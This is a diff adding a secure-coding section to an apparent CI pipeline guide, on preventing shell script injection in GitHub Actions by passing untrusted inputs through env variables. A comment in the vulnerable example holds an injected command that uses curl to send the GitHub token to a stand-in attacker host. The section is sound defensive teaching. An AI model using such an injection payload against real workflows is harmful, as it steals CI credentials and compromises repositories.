@@ -8,6 +8,46 @@ CI pipelines must execute tests reliably, quickly, and provide clear feedback. B
 
 CI is the quality gate for production. A poorly configured pipeline either wastes developer time (slow feedback, false positives) or ships broken code (false negatives, insufficient coverage). Burn-in testing ensures reliability by stress-testing changed code, while parallel execution and intelligent test selection optimize speed without sacrificing thoroughness.
 
+## Security: Script Injection Prevention
+
+**Rule:** NEVER use `${{ inputs.* }}` or user-controlled GitHub context directly in `run:` blocks. Always pass through `env:` and reference as `"$ENV_VAR"` (double-quoted).
+
+When CI templates are extended into reusable workflows (`on: workflow_call`), manual dispatch workflows (`on: workflow_dispatch`), or composite actions, `${{ inputs.* }}` values become user-controllable. Interpolating them directly in `run:` blocks enables shell command injection.
+
+### Vulnerable vs Safe Pattern
+
+```yaml
+# ❌ VULNERABLE — inputs.test_ids could contain: "; curl attacker.com/steal?t=$(cat $GITHUB_TOKEN)"
+- name: Run tests
+  run: |
+    npx playwright test --grep "${{ inputs.test_ids }}"
+
+# ✅ SAFE — env var cannot break out of shell quoting
+- name: Run tests
+  env:
+    TEST_IDS: ${{ inputs.test_ids }}
+  run: |
+    npx playwright test --grep "$TEST_IDS"
+```
+
+### Unsafe Contexts (require env: intermediary)
+
+- `${{ inputs.* }}` — workflow_call and workflow_dispatch inputs
+- `${{ github.event.pull_request.title }}` — PR title (user-controlled)
+- `${{ github.event.issue.body }}` — issue body (user-controlled)
+- `${{ github.event.comment.body }}` — comment body (user-controlled)
+- `${{ github.head_ref }}` — PR source branch name (user-controlled)
+
+### Safe Contexts (can use directly in run: blocks)
+
+- `${{ steps.*.outputs.* }}` — pre-computed by your own code
+- `${{ matrix.* }}` — defined in workflow YAML
+- `${{ runner.os }}`, `${{ github.sha }}`, `${{ github.ref }}` — system-controlled
+- `${{ secrets.* }}` — secret store, not user-injectable
+- `${{ env.* }}` — already an env var
+
+---
+
 ## Pattern Examples
 
 ### Example 1: GitHub Actions Workflow with Parallel Execution
